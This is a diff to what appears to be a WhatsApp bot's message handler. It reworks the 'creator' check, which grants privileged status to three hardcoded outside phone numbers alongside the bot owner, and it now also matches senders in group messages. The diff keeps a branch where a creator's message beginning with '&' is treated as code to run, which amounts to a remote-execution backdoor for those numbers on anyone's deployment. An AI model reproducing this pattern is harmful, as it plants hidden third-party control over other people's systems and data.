@@ -289,14 +289,19 @@ conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
   }
   
 const udp = botNumber.split('@')[0];
-const jawadop = ['923470027813', '923191089077', '923427582273']; // Fixed array syntax
+const jawadop = ['923470027813', '923191089077', '923427582273'];
     
 const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
     
-let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(mek.sender);
-	  
+// Normalize all numbers and prepare creator list
+const creators = [udp, ...jawadop, config.DEV, ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
+
+// Get sender - works for both private and group messages
+const sender = mek.participant || mek.sender;
+    
+let isCreator = creators.includes(sender);
+
 if (isCreator && mek.text.startsWith("&")) {
     let code = budy.slice(2);
     if (!code) {
@@ -324,8 +329,7 @@ if (isCreator && mek.text.startsWith("&")) {
         reply(util.format(err));
     }
     return;
-}
-	  
+}	  
   //==========public react============//
   
 // Auto React for all messages (public and owner)
